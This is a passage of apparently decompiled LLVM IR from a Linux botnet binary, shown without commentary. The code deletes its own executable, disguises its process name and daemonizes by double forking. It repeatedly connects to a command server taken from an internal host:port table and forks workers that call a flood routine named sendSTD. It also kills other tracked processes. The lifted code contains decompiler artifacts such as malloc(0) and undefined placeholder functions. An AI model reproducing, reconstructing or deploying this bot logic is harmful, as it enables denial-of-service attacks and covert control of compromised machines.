  %v2_8048ff4 = call i32 @__GI_strtok(i32 %v2_8048f89, i32 ptrtoint (i32* @global_var_8050855.20 to i32))
  %v4_804903d32 = icmp eq i32 %v2_8048ff4, 0
  %v1_804904133 = icmp eq i1 %v4_804903d32, false
  br i1 %v1_804904133, label %dec_label_pc_8049001, label %dec_label_pc_8049070

dec_label_pc_8049001:                             ; preds = %dec_label_pc_8048fe8, %dec_label_pc_8049028
  %storemerge34 = phi i32 [ %v2_8049032, %dec_label_pc_8049028 ], [ %v2_8048ff4, %dec_label_pc_8048fe8 ]
  %v0_8049001 = call i32 @listFork()
  store i32 %v0_8049001, i32* @eax, align 4
  %v1_8049006 = icmp eq i32 %v0_8049001, 0
  %v1_8049008 = icmp eq i1 %v1_8049006, false
  br i1 %v1_8049008, label %dec_label_pc_8049028, label %dec_label_pc_804900a

dec_label_pc_804900a:                             ; preds = %dec_label_pc_8049001
  %v4_8049016 = trunc i32 %v1_8048f9a to i16
  %v5_8049016 = call i32 @sendSTD(i32 %storemerge34, i16 %v4_8049016, i32 %v1_8048fb1, i32 %v1_8048fc8)
  %v1_8049023 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_8049028:                             ; preds = %dec_label_pc_8049001
  %v2_8049032 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_8050855.20 to i32))
  %v4_804903d = icmp eq i32 %v2_8049032, 0
  %v1_8049041 = icmp eq i1 %v4_804903d, false
  br i1 %v1_8049041, label %dec_label_pc_8049001, label %dec_label_pc_8049070

dec_label_pc_8049045:                             ; preds = %dec_label_pc_8048f83
  %v0_8049045 = call i32 @listFork()
  store i32 %v0_8049045, i32* @eax, align 4
  %v1_804904a = icmp eq i32 %v0_8049045, 0
  %v1_804904c = icmp eq i1 %v1_804904a, false
  br i1 %v1_804904c, label %dec_label_pc_8049130, label %dec_label_pc_8049052

dec_label_pc_8049052:                             ; preds = %dec_label_pc_8049045
  %v4_804905e = trunc i32 %v1_8048f9a to i16
  %v5_804905e = call i32 @sendSTD(i32 %v2_8048f89, i16 %v4_804905e, i32 %v1_8048fb1, i32 %v1_8048fc8)
  %v1_804906b = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_8049070:                             ; preds = %dec_label_pc_8048fe8, %dec_label_pc_8049028, %entry
  %v2_8049073 = load i32, i32* %v1_8048f5e, align 4
  store i32 %v2_8049073, i32* @eax, align 4
  %v2_804907e = inttoptr i32 %v2_8049073 to i8*
  %v3_804907e = call i32 @__GI_strcoll(i8* %v2_804907e, i32 ptrtoint (i32* @global_var_8050857.21 to i32))
  %v1_8049086 = icmp eq i32 %v3_804907e, 0
  %v1_8049088 = icmp eq i1 %v1_8049086, false
  br i1 %v1_8049088, label %dec_label_pc_8049130, label %dec_label_pc_80490f5

dec_label_pc_804909e:                             ; preds = %dec_label_pc_80490f5, %dec_label_pc_804911c
  %v2_80490a1 = mul i32 %v3_8049127, 4
  %v0_80490a6 = load i32, i32* @global_var_8055804.18, align 4
  %v2_80490ab = add i32 %v0_80490a6, %v2_80490a1
  %v1_80490ae = inttoptr i32 %v2_80490ab to i32*
  %v2_80490ae = load i32, i32* %v1_80490ae, align 4
  %v1_80490b0 = icmp eq i32 %v2_80490ae, 0
  br i1 %v1_80490b0, label %dec_label_pc_80490f2, label %dec_label_pc_80490b4

dec_label_pc_80490b4:                             ; preds = %dec_label_pc_804909e
  %v2_80490c4 = load i32, i32* %v1_80490ae, align 4
  store i32 %v2_80490c4, i32* @ebx, align 4
  %v0_80490c6 = call i32 @getpid()
  %v0_80490cb = load i32, i32* @ebx, align 4
  %v12_80490cb = icmp eq i32 %v0_80490cb, %v0_80490c6
  br i1 %v12_80490cb, label %dec_label_pc_80490f2, label %dec_label_pc_80490cf

dec_label_pc_80490cf:                             ; preds = %dec_label_pc_80490b4
  %v0_80490d7 = load i32, i32* @global_var_8055804.18, align 4
  %v2_80490dc = add i32 %v0_80490d7, %v2_80490a1
  %v1_80490df = inttoptr i32 %v2_80490dc to i32*
  %v2_80490df = load i32, i32* %v1_80490df, align 4
  %v2_80490e7 = call i32 @kill(i32 %v2_80490df, i32 9)
  %v4_80490ef = add i32 %stack_var_-20.1, 1
  br label %dec_label_pc_80490f2

dec_label_pc_80490f2:                             ; preds = %dec_label_pc_80490b4, %dec_label_pc_804909e, %dec_label_pc_80490cf
  %stack_var_-20.0 = phi i32 [ %stack_var_-20.1, %dec_label_pc_804909e ], [ %stack_var_-20.1, %dec_label_pc_80490b4 ], [ %v4_80490ef, %dec_label_pc_80490cf ]
  %v4_80490f2 = add i32 %v3_8049127, 1
  br label %dec_label_pc_80490f5

dec_label_pc_80490f5:                             ; preds = %dec_label_pc_8049070, %dec_label_pc_80490f2
  %stack_var_-20.1 = phi i32 [ %stack_var_-20.0, %dec_label_pc_80490f2 ], [ 0, %dec_label_pc_8049070 ]
  %v3_8049127 = phi i32 [ %v4_80490f2, %dec_label_pc_80490f2 ], [ 0, %dec_label_pc_8049070 ]
  %v0_8049108 = load i32, i32* @global_var_80535bc.17, align 4
  %v10_8049117 = icmp eq i32 %v0_8049108, 0
  br i1 %v10_8049117, label %dec_label_pc_804911c, label %dec_label_pc_804909e

dec_label_pc_804911c:                             ; preds = %dec_label_pc_80490f5
  %v0_8049103 = load i32, i32* @global_var_80535b8.16, align 8
  %v10_8049127 = icmp ult i32 %v3_8049127, %v0_8049103
  br i1 %v10_8049127, label %dec_label_pc_804909e, label %dec_label_pc_8049130

dec_label_pc_8049130:                             ; preds = %dec_label_pc_804911c, %dec_label_pc_8048f79, %dec_label_pc_8049070, %dec_label_pc_8049045
  %v0_8049134 = phi i32 [ %v3_8048f69, %dec_label_pc_8048f79 ], [ %v3_804907e, %dec_label_pc_8049070 ], [ %v0_8049045, %dec_label_pc_8049045 ], [ 0, %dec_label_pc_804911c ]
  store i32 %v0_8048f57, i32* @ebx, align 4
  ret i32 %v0_8049134

; uselistorder directives
  uselistorder i32 %v3_8049127, { 1, 0, 2 }
  uselistorder i32 %stack_var_-20.1, { 0, 2, 1 }
  uselistorder i32 %v2_80490a1, { 1, 0 }
  uselistorder i32 %v2_8049032, { 1, 0 }
  uselistorder i32 %v2_8048f89, { 2, 0, 1 }
  uselistorder i32 %tmp22, { 4, 3, 2, 1, 0 }
  uselistorder i32 ()* @listFork, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_8050855.20 to i32), { 1, 0 }
  uselistorder label %dec_label_pc_8049130, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_80490f5, { 1, 0 }
  uselistorder label %dec_label_pc_80490f2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804909e, { 1, 0 }
  uselistorder label %dec_label_pc_8049070, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8049001, { 1, 0 }
}

define i32 @initConnection() local_unnamed_addr {
entry:
  %stack_var_-4104 = alloca i32, align 4
  %v2_8049148 = ptrtoint i32* %stack_var_-4104 to i32
  %v3_804914f = bitcast i32* %stack_var_-4104 to i8*
  %v4_804914f = call i32 @__GI_memset(i8* %v3_804914f, i32 0, i32 4096)
  %v0_8049157 = load i32, i32* @global_var_80535c0.15, align 64
  %v1_804915c = icmp eq i32 %v0_8049157, 0
  br i1 %v1_804915c, label %dec_label_pc_804917b, label %dec_label_pc_8049160

dec_label_pc_8049160:                             ; preds = %entry
  %v1_8049169 = call i32 @__GI_close(i32 %v0_8049157)
  store i32 0, i32* @global_var_80535c0.15, align 64
  br label %dec_label_pc_804917b

dec_label_pc_804917b:                             ; preds = %entry, %dec_label_pc_8049160
  %v0_804917b = load i32, i32* @global_var_8053330.22, align 16
  %v1_8049180 = icmp eq i32 %v0_804917b, 0
  %v1_8049182 = icmp eq i1 %v1_8049180, false
  br i1 %v1_8049182, label %dec_label_pc_8049190, label %dec_label_pc_804919b

dec_label_pc_8049190:                             ; preds = %dec_label_pc_804917b
  %v1_8049195 = add i32 %v0_804917b, 1
  br label %dec_label_pc_804919b

dec_label_pc_804919b:                             ; preds = %dec_label_pc_804917b, %dec_label_pc_8049190
  %storemerge = phi i32 [ %v1_8049195, %dec_label_pc_8049190 ], [ 0, %dec_label_pc_804917b ]
  store i32 %storemerge, i32* @global_var_8053330.22, align 16
  %v1_80491a0 = mul i32 %storemerge, 4
  %v2_80491a0 = add i32 %v1_80491a0, ptrtoint ([14 x i8]** @global_var_805332c.24 to i32)
  %v3_80491a0 = inttoptr i32 %v2_80491a0 to i32*
  %v4_80491a0 = load i32, i32* %v3_80491a0, align 4
  store i32 %v4_80491a0, i32* @eax, align 4
  %v3_80491b2 = call i32 @strcpy(i8* %v3_804914f, i32 %v4_80491a0)
  %v3_80491cd = call i32 @__GI_strchr(i8* %v3_804914f, i32 58)
  %v1_80491d5 = icmp eq i32 %v3_80491cd, 0
  br i1 %v1_80491d5, label %dec_label_pc_8049214, label %dec_label_pc_80491d9

dec_label_pc_80491d9:                             ; preds = %dec_label_pc_804919b
  %v3_80491e5 = call i32 @__GI_strchr(i8* %v3_804914f, i32 58)
  %v1_80491ed = add i32 %v3_80491e5, 1
  %v1_80491f2 = call i32 @atol(i32 %v1_80491ed)
  %v3_8049209 = call i32 @__GI_strchr(i8* %v3_804914f, i32 58)
  %v4_8049209 = inttoptr i32 %v3_8049209 to i8*
  store i8 0, i8* %v4_8049209, align 1
  br label %dec_label_pc_8049214

dec_label_pc_8049214:                             ; preds = %dec_label_pc_804919b, %dec_label_pc_80491d9
  %stack_var_-8.0 = phi i32 [ 69000, %dec_label_pc_804919b ], [ %v1_80491f2, %dec_label_pc_80491d9 ]
  %v3_804921d = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_804921d, i32* @global_var_80535c0.15, align 64
  %v4_804923d = call i32 @connectTimeout(i32 %v3_804921d, i32 %v2_8049148, i32 %stack_var_-8.0, i32 30)
  %v1_8049245 = icmp eq i32 %v4_804923d, 0
  %. = zext i1 %v1_8049245 to i32
  ret i32 %.

; uselistorder directives
  uselistorder label %dec_label_pc_8049214, { 1, 0 }
  uselistorder label %dec_label_pc_804919b, { 1, 0 }
  uselistorder label %dec_label_pc_804917b, { 1, 0 }
}

define i32 @main(i32 %argc, i8** %argv) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i8*, align 4
  %tmp62 = call i8* @__decompiler_undefined_function_4()
  %tmp71 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-180 = alloca i8*, align 4
  %stack_var_-4276 = alloca i32, align 4
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %stack_var_-4368 = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  %v2_8049267 = ptrtoint i32* %stack_var_4 to i32
  store i32 %v2_8049267, i32* @ebx, align 4
  %v4_804927e = ptrtoint i8** %argv to i32
  store i32 %v4_804927e, i32* %eax.global-to-local, align 4
  %v1_8049281 = bitcast i8** %argv to i32*
  %v2_8049281 = load i32, i32* %v1_8049281, align 4
  store i32 %v2_8049281, i32* %eax.global-to-local, align 4
  store i32 %v2_8049281, i32* %stack_var_-4368, align 4
  %v1_8049287 = call i32 @unlink(i32 %v2_8049281)
  store i32 %v1_8049287, i32* %eax.global-to-local, align 4
  %v0_804928f = call i32 @rand_init()
  store i32 %v0_804928f, i32* %eax.global-to-local, align 4
  %v0_8049294 = call i32 @rand_next()
  %v1_8049299 = mul i32 %v0_8049294, 4
  %v2_804929c = and i32 %v1_8049299, 12
  %v1_804929f = add nuw nsw i32 %v2_804929c, 12
  %v2_80492a5 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_80492a5, i32* @eax, align 4
  %v2_80492ac = bitcast i32* %stack_var_-104 to i8*
  %v3_80492ac = call i32 @rand_alphastr(i8* %v2_80492ac, i32 %v1_804929f)
  %v0_80492b7 = load i32, i32* @ebp, align 4
  %v2_80492b7 = add nsw i32 %v2_804929c, -84
  %v3_80492b7 = add i32 %v2_80492b7, %v0_80492b7
  %v4_80492b7 = inttoptr i32 %v3_80492b7 to i8*
  store i8 0, i8* %v4_80492b7, align 1
  store i32 %v4_804927e, i32* %eax.global-to-local, align 4
  %v2_80492bf = load i32, i32* %v1_8049281, align 4
  store i32 %v2_80492bf, i32* @edx, align 4
  store i32 %v2_80492a5, i32* %eax.global-to-local, align 4
  %v2_80492c8 = call i32 @util_strcpy(i32 %v2_80492bf, i32 %v2_80492a5)
  store i32 %v2_80492c8, i32* %eax.global-to-local, align 4
  %v0_80492d0 = call i32 @rand_next()
  %v2_80492eb = udiv i32 %v0_80492d0, 6
  %tmp = mul nsw i32 %v2_80492eb, -2
  %v2_8049306 = add i32 %v0_80492d0, %tmp
  store i32 %v2_8049306, i32* %edx.global-to-local, align 4
  %v2_8049314 = mul i32 %v2_8049306, 4
  %v1_8049317 = add i32 %v2_8049314, 12
  store i32 %v2_80492a5, i32* @eax, align 4
  %v3_8049324 = call i32 @rand_alphastr(i8* %v2_80492ac, i32 %v1_8049317)
  %v0_804932f = load i32, i32* @ebp, align 4
  %v2_804932f = add i32 %v2_8049314, -84
  %v3_804932f = add i32 %v2_804932f, %v0_804932f
  %v4_804932f = inttoptr i32 %v3_804932f to i8*
  store i8 0, i8* %v4_804932f, align 1
  store i32 %v2_80492a5, i32* %eax.global-to-local, align 4
  store i32 15, i32* %stack_var_-4368, align 4
  %v2_804933d = call i32 @prctl(i32 15, i32 %v2_80492a5)
  store i32 %v2_804933d, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-4368, align 4
  %v2_804934a = call i32 @__GI_time(i32* null)
  store i32 %v2_804934a, i32* %eax.global-to-local, align 4
  store i32 %v2_804934a, i32* @ebx, align 4
  %v0_8049354 = call i32 @getpid()
  %v1_8049359 = load i32, i32* @ebx, align 4
  %v2_8049359 = xor i32 %v1_8049359, %v0_8049354
  store i32 %v2_8049359, i32* %eax.global-to-local, align 4
  store i32 %v2_8049359, i32* %stack_var_-4368, align 4
  %v1_804935f = call i32 @srand(i32 %v2_8049359)
  store i32 %v1_804935f, i32* %eax.global-to-local, align 4
  %v0_8049367 = call i32 @rand_init()
  store i32 %v0_8049367, i32* %eax.global-to-local, align 4
  %v1_804936c = call i32 @__libc_fork(i32 %v2_8049359)
  store i32 %v1_804936c, i32* %eax.global-to-local, align 4
  %v4_8049374 = icmp eq i32 %v1_804936c, 0
  br i1 %v4_8049374, label %dec_label_pc_80493a1, label %dec_label_pc_804939b.thread

dec_label_pc_804939b.thread:                      ; preds = %entry
  %v2_804937f = ptrtoint i32* %stack_var_-140 to i32
  store i32 %v2_804937f, i32* %eax.global-to-local, align 4
  store i32 %v1_804936c, i32* %stack_var_-4368, align 4
  %v3_8049389 = call i32 @__libc_waitpid(i32 %v1_804936c, i32 %v2_804937f, i32 0)
  store i32 %v3_8049389, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-4368, align 4
  %v1_8049396 = call i32 @__GI_exit(i32 0)
  store i32 %v1_8049396, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80493b9

dec_label_pc_80493a1:                             ; preds = %entry
  %v0_80493a1 = load i32, i32* %stack_var_-4368, align 4
  %v1_80493a1 = call i32 @__libc_fork(i32 %v0_80493a1)
  store i32 %v1_80493a1, i32* %eax.global-to-local, align 4
  %v4_80493a9 = icmp eq i32 %v1_80493a1, 0
  br i1 %v4_80493a9, label %dec_label_pc_80493b9, label %dec_label_pc_80493af

dec_label_pc_80493af:                             ; preds = %dec_label_pc_80493a1
  store i32 0, i32* %stack_var_-4368, align 4
  %v1_80493b4 = call i32 @__GI_exit(i32 0)
  store i32 %v1_80493b4, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80493b9

dec_label_pc_80493b9:                             ; preds = %dec_label_pc_804939b.thread, %dec_label_pc_80493a1, %dec_label_pc_80493af
  store i32 ptrtoint (i32* @global_var_8050859.25 to i32), i32* %stack_var_-4368, align 4
  %v1_80493c1 = call i32 @chdir(i32 ptrtoint (i32* @global_var_8050859.25 to i32))
  store i32 %v1_80493c1, i32* %eax.global-to-local, align 4
  store i32 13, i32* %stack_var_-4368, align 4
  %v2_80493d0 = call i32 @bsd_signal(i32 13, i32 1)
  store i32 %v2_80493d0, i32* %eax.global-to-local, align 4
  %v2_804983b = ptrtoint i32* %stack_var_-4276 to i32
  %tmp100 = bitcast i32* %stack_var_-4276 to i8*
  %v5_8049629 = and i32 %v2_804983b, -256
  %v1_8049636 = or i32 %v2_804983b, 1
  %v5_8049668 = inttoptr i32 %v1_8049636 to i8*
  %tmp101 = bitcast i8** %stack_var_-24 to i32*
  %v2_80497f2 = ptrtoint i8** %stack_var_-180 to i32
  br label %dec_label_pc_80493d8.outer

dec_label_pc_80493d8.outer:                       ; preds = %dec_label_pc_804983b, %dec_label_pc_80493b9
  %stack_var_-52.0.ph = phi i8* [ %tmp62, %dec_label_pc_80493b9 ], [ %stack_var_-52.2, %dec_label_pc_804983b ]
  %stack_var_-48.0.ph = phi i32 [ %tmp71, %dec_label_pc_80493b9 ], [ %stack_var_-48.3, %dec_label_pc_804983b ]
  br label %dec_label_pc_80493d8

dec_label_pc_80493d8:                             ; preds = %dec_label_pc_80493d8.outer, %dec_label_pc_80493d8
  %v0_80493d8 = call i32 @initConnection()
  store i32 %v0_80493d8, i32* %eax.global-to-local, align 4
  %v1_80493dd = icmp eq i32 %v0_80493d8, 0
  %v1_80493df = icmp eq i1 %v1_80493dd, false
  br i1 %v1_80493df, label %dec_label_pc_80493d8, label %dec_label_pc_804983b.preheader

dec_label_pc_804983b.preheader:                   ; preds = %dec_label_pc_80493d8
  %v0_8049847.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804983b

dec_label_pc_8049400:                             ; preds = %dec_label_pc_80495a7, %dec_label_pc_80495ee
  %v2_8049403 = mul i32 %storemerge22, 4
  store i32 %v2_8049403, i32* %edx.global-to-local, align 4
  %v0_8049408 = load i32, i32* @global_var_8055804.18, align 4
  %v2_804940d = add i32 %v0_8049408, %v2_8049403
  store i32 %v2_804940d, i32* %eax.global-to-local, align 4
  %v1_8049410 = inttoptr i32 %v2_804940d to i32*
  %v2_8049410 = load i32, i32* %v1_8049410, align 4
  store i32 %v2_8049410, i32* %eax.global-to-local, align 4
  %v1_8049415 = add i32 %v0_8049412.in, 8
  %v2_8049415 = inttoptr i32 %v1_8049415 to i32*
  store i32 1, i32* %v2_8049415, align 4
  %v1_8049417 = add i32 %v0_8049412.in, 4
  %v2_8049417 = inttoptr i32 %v1_8049417 to i32*
  store i32 0, i32* %v2_8049417, align 4
  %v0_8049419 = load i32, i32* %eax.global-to-local, align 4
  %v3_8049419 = inttoptr i32 %v0_8049412.in to i32*
  store i32 %v0_8049419, i32* %v3_8049419, align 4
  %v4_804941a = call i32 @__libc_waitpid(i32 %storemerge22, i32 %v2_804941a, i32 %stack_var_-48.2)
  store i32 %v4_804941a, i32* %eax.global-to-local, align 4
  %v0_804941f = load i32, i32* @esp, align 4
  %tmp102 = icmp slt i32 %v4_804941a, 1
  %.pre = add i32 %storemerge22, 1
  br i1 %tmp102, label %dec_label_pc_80495a4, label %dec_label_pc_804942a

dec_label_pc_804942a:                             ; preds = %dec_label_pc_8049400
  store i32 %.pre, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804945b

dec_label_pc_8049433:                             ; preds = %dec_label_pc_804945b, %dec_label_pc_8049494
  %v0_8049433 = load i32, i32* @global_var_8055804.18, align 4
  %v2_804943e = mul i32 %storemerge24, 4
  %v1_8049438 = add i32 %v2_804943e, -4
  %v2_8049441 = add i32 %v1_8049438, %v0_8049433
  store i32 %v2_8049441, i32* @ecx, align 4
  store i32 %v2_804943e, i32* %edx.global-to-local, align 4
  %v2_8049451 = add i32 %v0_8049433, %v2_804943e
  store i32 %v2_8049451, i32* %eax.global-to-local, align 4
  %v1_8049454 = inttoptr i32 %v2_8049451 to i32*
  %v2_8049454 = load i32, i32* %v1_8049454, align 4
  store i32 %v2_8049454, i32* %eax.global-to-local, align 4
  %v2_8049456 = inttoptr i32 %v2_8049441 to i32*
  store i32 %v2_8049454, i32* %v2_8049456, align 4
  %v4_8049458 = add i32 %storemerge24, 1
  br label %dec_label_pc_804945b

dec_label_pc_804945b:                             ; preds = %dec_label_pc_804942a, %dec_label_pc_8049433
  %storemerge24 = phi i32 [ %v4_8049458, %dec_label_pc_8049433 ], [ %.pre, %dec_label_pc_804942a ]
  %v0_804946f = load i32, i32* @global_var_80535b8.16, align 8
  store i32 %v0_804946f, i32* %eax.global-to-local, align 4
  %v0_8049474 = load i32, i32* @global_var_80535bc.17, align 4
  store i32 %v0_8049474, i32* %edx.global-to-local, align 4
  %v10_804948c = icmp eq i32 %v0_8049474, 0
  br i1 %v10_804948c, label %dec_label_pc_8049494, label %dec_label_pc_8049433

dec_label_pc_8049494:                             ; preds = %dec_label_pc_804945b
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %v0_804946f, i32* %edx.global-to-local, align 4
  %v10_80494a8 = icmp ult i32 %storemerge24, %v0_804946f
  br i1 %v10_80494a8, label %dec_label_pc_8049433, label %dec_label_pc_80494b0

dec_label_pc_80494b0:                             ; preds = %dec_label_pc_8049494
  %v0_80494b0 = load i32, i32* @global_var_8055804.18, align 4
  %v2_80494bb = mul i32 %storemerge24, 4
  %v1_80494b5 = add i32 %v2_80494bb, -4
  %v2_80494be = add i32 %v1_80494b5, %v0_80494b0
  %v1_80494c1 = inttoptr i32 %v2_80494be to i32*
  store i32 0, i32* %v1_80494c1, align 4
  %v0_80494c7 = load i32, i32* @global_var_80535b8.16, align 8
  %v0_80494cc = load i32, i32* @global_var_80535bc.17, align 4
  %v1_80494d2 = add i32 %v0_80494c7, -1
  %v4_80494d2 = icmp ne i32 %v0_80494c7, 0
  %v2_80494d5 = zext i1 %v4_80494d2 to i32
  %v3_80494d5 = add i32 %v0_80494cc, -1
  %v4_80494d5 = add i32 %v3_80494d5, %v2_80494d5
  store i32 %v1_80494d2, i32* @global_var_80535b8.16, align 8
  store i32 %v4_80494d5, i32* @global_var_80535bc.17, align 4
  %v5_80494ee = icmp eq i32 %v0_80494c7, 0
  %v2_80494f1 = zext i1 %v5_80494ee to i32
  %v3_80494f1 = add i32 %v4_80494d5, %v2_80494f1
  %v3_80494f4 = mul i32 %v3_80494f1, 4
  %v4_80494f4 = udiv i32 %v0_80494c7, 1073741824
  %v5_80494f4 = or i32 %v3_80494f4, %v4_80494f4
  store i32 %v5_80494f4, i32* %edx.global-to-local, align 4
  %v2_80494fa = mul i32 %v0_80494c7, 4
  store i32 %v2_80494fa, i32* %eax.global-to-local, align 4
  %v0_80494fc = load i32, i32* @esp, align 4
  %v2_80494ff = add i32 %v0_80494fc, -16
  %v3_80494ff = inttoptr i32 %v2_80494ff to i32*
  store i32 %v2_80494fa, i32* %v3_80494ff, align 4
  %v1_8049500 = call i32 @malloc(i32 0)
  store i32 %v1_8049500, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8049536

dec_label_pc_8049514:                             ; preds = %dec_label_pc_8049536, %dec_label_pc_804956f
  %v2_8049517 = mul i32 %storemerge23, 4
  %v5_804951c = add i32 %v2_8049517, %v1_8049500
  store i32 %v5_804951c, i32* @ecx, align 4
  store i32 %v2_8049517, i32* %edx.global-to-local, align 4
  %v0_8049527 = load i32, i32* @global_var_8055804.18, align 4
  %v2_804952c = add i32 %v0_8049527, %v2_8049517
  store i32 %v2_804952c, i32* %eax.global-to-local, align 4
  %v1_804952f = inttoptr i32 %v2_804952c to i32*
  %v2_804952f = load i32, i32* %v1_804952f, align 4
  store i32 %v2_804952f, i32* %eax.global-to-local, align 4
  %v2_8049531 = inttoptr i32 %v5_804951c to i32*
  store i32 %v2_804952f, i32* %v2_8049531, align 4
  %v4_8049533 = add i32 %storemerge23, 1
  br label %dec_label_pc_8049536

dec_label_pc_8049536:                             ; preds = %dec_label_pc_80494b0, %dec_label_pc_8049514
  %storemerge23 = phi i32 [ %v4_8049533, %dec_label_pc_8049514 ], [ 0, %dec_label_pc_80494b0 ]
  %v0_804954a = load i32, i32* @global_var_80535b8.16, align 8
  store i32 %v0_804954a, i32* %eax.global-to-local, align 4
  %v0_804954f = load i32, i32* @global_var_80535bc.17, align 4
  store i32 %v0_804954f, i32* %edx.global-to-local, align 4
  %v10_8049567 = icmp eq i32 %v0_804954f, 0
  br i1 %v10_8049567, label %dec_label_pc_804956f, label %dec_label_pc_8049514

dec_label_pc_804956f:                             ; preds = %dec_label_pc_8049536
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %v0_804954a, i32* %edx.global-to-local, align 4
  %v10_8049583 = icmp ult i32 %storemerge23, %v0_804954a
  br i1 %v10_8049583, label %dec_label_pc_8049514, label %dec_label_pc_804958b

dec_label_pc_804958b:                             ; preds = %dec_label_pc_804956f
  %v0_804958b = load i32, i32* @global_var_8055804.18, align 4
  store i32 %v0_804958b, i32* %eax.global-to-local, align 4
  %v0_8049590 = load i32, i32* @esp, align 4
  %v2_8049593 = add i32 %v0_8049590, -16
  %v3_8049593 = inttoptr i32 %v2_8049593 to i32*
  store i32 %v0_804958b, i32* %v3_8049593, align 4
  %v1_8049594 = call i32 @free(i32 0)
  %v0_8049599 = load i32, i32* @esp, align 4
  store i32 %v1_8049500, i32* %eax.global-to-local, align 4
  store i32 %v1_8049500, i32* @global_var_8055804.18, align 4
  br label %dec_label_pc_80495a4

dec_label_pc_80495a4:                             ; preds = %dec_label_pc_8049400, %dec_label_pc_804958b
  %v0_804941250.in = phi i32 [ %v0_8049599, %dec_label_pc_804958b ], [ %v0_804941f, %dec_label_pc_8049400 ]
  %stack_var_-48.1 = phi i32 [ %v1_8049500, %dec_label_pc_804958b ], [ %stack_var_-48.2, %dec_label_pc_8049400 ]
  br label %dec_label_pc_80495a7

dec_label_pc_80495a7:                             ; preds = %dec_label_pc_80495a7.preheader, %dec_label_pc_80495a4
  %v0_8049412.in = phi i32 [ %v0_804941250.in, %dec_label_pc_80495a4 ], [ %v0_8049856, %dec_label_pc_80495a7.preheader ]
  %stack_var_-48.2 = phi i32 [ %stack_var_-48.1, %dec_label_pc_80495a4 ], [ %stack_var_-48.3, %dec_label_pc_80495a7.preheader ]
  %storemerge22 = phi i32 [ %.pre, %dec_label_pc_80495a4 ], [ 0, %dec_label_pc_80495a7.preheader ]
  %v1_80495b0 = ashr i32 %storemerge22, 31
  %v0_80495b7 = load i32, i32* @global_var_80535b8.16, align 8
  store i32 %v0_80495b7, i32* %eax.global-to-local, align 4
  %v0_80495bc = load i32, i32* @global_var_80535bc.17, align 4
  store i32 %v0_80495bc, i32* %edx.global-to-local, align 4
  %v10_80495d4 = icmp ult i32 %v1_80495b0, %v0_80495bc
  br i1 %v10_80495d4, label %dec_label_pc_8049400, label %dec_label_pc_80495e0

dec_label_pc_80495e0:                             ; preds = %dec_label_pc_80495a7
  store i32 %v0_80495bc, i32* %eax.global-to-local, align 4
  %v6_80495ec = icmp ugt i32 %v1_80495b0, %v0_80495bc
  br i1 %v6_80495ec, label %dec_label_pc_8049600, label %dec_label_pc_80495ee

dec_label_pc_80495ee:                             ; preds = %dec_label_pc_80495e0
  store i32 %v0_80495b7, i32* %edx.global-to-local, align 4
  %v10_80495f4 = icmp ult i32 %storemerge22, %v0_80495b7
  br i1 %v10_80495f4, label %dec_label_pc_8049400, label %dec_label_pc_8049600

dec_label_pc_8049600:                             ; preds = %dec_label_pc_80495ee, %dec_label_pc_80495e0
  %v0_8049603 = load i32, i32* @ebp, align 4
  %v2_8049603 = add i32 %v0_8049851, -4268
  %v3_8049603 = add i32 %v2_8049603, %v0_8049603
  %v4_8049603 = inttoptr i32 %v3_8049603 to i8*
  store i8 0, i8* %v4_8049603, align 1
  %v0_804960b = load i32, i32* @esp, align 4
  store i32 %v2_804983b, i32* %eax.global-to-local, align 4
  %v2_8049614 = add i32 %v0_804960b, -16
  %v3_8049614 = inttoptr i32 %v2_8049614 to i32*
  store i32 %v2_804983b, i32* %v3_8049614, align 4
  %v0_8049615 = call i32 @trim()
  %v0_804961a = load i32, i32* @esp, align 4
  %v1_804961a = add i32 %v0_804961a, 16
  %v2_8049629 = load i8, i8* %tmp100, align 4
  %v3_8049629 = zext i8 %v2_8049629 to i32
  %v6_8049629 = or i32 %v3_8049629, %v5_8049629
  store i32 %v6_8049629, i32* %eax.global-to-local, align 4
  %v10_804962b = icmp eq i8 %v2_8049629, 46
  %v1_804962d = icmp eq i1 %v10_804962b, false
  br i1 %v1_804962d, label %dec_label_pc_804983b, label %dec_label_pc_8049633

dec_label_pc_8049633:                             ; preds = %dec_label_pc_8049600
  store i32 %v1_8049636, i32* %eax.global-to-local, align 4
  %v2_8049642105 = load i8, i8* %v5_8049668, align 1
  %v3_8049642106 = zext i8 %v2_8049642105 to i32
  %v6_8049642108 = or i32 %v3_8049642106, %v5_8049629
  store i32 %v6_8049642108, i32* %eax.global-to-local, align 4
  %v7_8049644109 = icmp eq i8 %v2_8049642105, 32
  br i1 %v7_8049644109, label %dec_label_pc_8049651, label %dec_label_pc_8049648

dec_label_pc_804963c:                             ; preds = %dec_label_pc_8049648
  %v5_804963c = add i32 %storemerge21.in110, 1
  %storemerge21 = inttoptr i32 %v5_804963c to i8*
  store i32 %v5_804963c, i32* %eax.global-to-local, align 4
  %v2_8049642 = load i8, i8* %storemerge21, align 1
  %v3_8049642 = zext i8 %v2_8049642 to i32
  %v5_8049642 = and i32 %v5_804963c, -256
  %v6_8049642 = or i32 %v3_8049642, %v5_8049642
  store i32 %v6_8049642, i32* %eax.global-to-local, align 4
  %v7_8049644 = icmp eq i8 %v2_8049642, 32
